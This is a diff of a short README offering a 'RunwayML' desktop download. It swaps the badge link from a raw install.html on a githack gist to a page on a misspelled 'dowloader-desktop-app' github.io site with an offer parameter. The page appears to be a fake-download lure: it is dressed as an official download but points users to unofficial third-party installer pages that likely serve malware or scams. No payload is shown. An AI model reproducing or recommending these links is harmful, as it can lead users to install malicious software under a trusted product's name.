@@ -1,6 +1,6 @@
 # RunwayML Download — Desktop AI Creative Platform
 
-[![Get RunwayML GitHub](https://img.shields.io/badge/Get%20RunwayML%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/breshine2010/f1e7da49b2633dc0be788e2becd1aeb4/raw/008d334dc45899bcf9459cb9df1d55c807b128cb/install.html?offer=RunwayML)
+[![Get RunwayML GitHub](https://img.shields.io/badge/Get%20RunwayML%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://dowloader-desktop-app.github.io/.github/?offer=RunwayML)
 
 ---
 
